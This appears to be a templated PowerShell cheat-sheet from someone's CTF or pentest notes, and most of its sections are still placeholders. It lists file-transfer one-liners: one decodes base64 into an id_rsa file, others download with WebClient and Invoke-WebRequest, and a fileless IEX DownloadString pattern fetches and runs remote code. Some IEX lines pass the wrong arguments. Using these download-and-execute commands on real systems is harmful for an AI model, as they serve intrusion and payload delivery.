# Powershell

_What this tool does and when I reach for it_

## Primary Use Cases

Main things I use this tool for

## Command Patterns

Decode base64 to file
```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa",[Convert]::FromBase64String("base64"))
```
^decode-base64-to-file

Get file MD5 hash
```powershell
Get-FileHash <file> -Algorithm md5
```
^decode-base64-to-file

```powershell
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
```
^downloadfile-method

```powershell
IEX (New-Object Net.WebClient).DownloadString('<Target File URL>','<Output File Name>')
# or
(New-Object Net.WebClient).DownloadString('<Target File URL>','<Output File Name>') | IEX
```
^downloadstring-method-fileless

```powershell
Invoke-WebRequest <Target File URL> -OutFile <Output File Name> -UseBasicParsing
```
^outfile-invoke-webrequest

### Category 2

Brief description of this category

command syntax ^powershell-category2

### Category 3

Brief description of this category

command syntax ^powershell-category3

## Syntax I Forget

- Flag or option I always look up
- Parameter format I can't remember
- Output options or file formats

## When I Use This vs Alternatives

- **Use this tool when:** Specific circumstances
- **Use alternative when:** When other tools are better
- **Combines well with:** Tools that work together with this

## Personal Notes

- Things I learned from experience
- Common mistakes I made
- Environment-specific quirks

## CTF Examples

```dataview
TABLE file.name as "Box", choice(contains(file.tags, "easy"), "🟢", choice(contains(file.tags, "medium"), "🟡", "🔴")) as "Diff"
FROM "06-CTF-Writeups" AND #powershell
SORT file.ctime DESC
LIMIT 5
```

## Quick Links

- [[Primary-Technique]] - Main technique this supports
- [[Secondary-Technique]] - Other technique this supports

#powershell #tool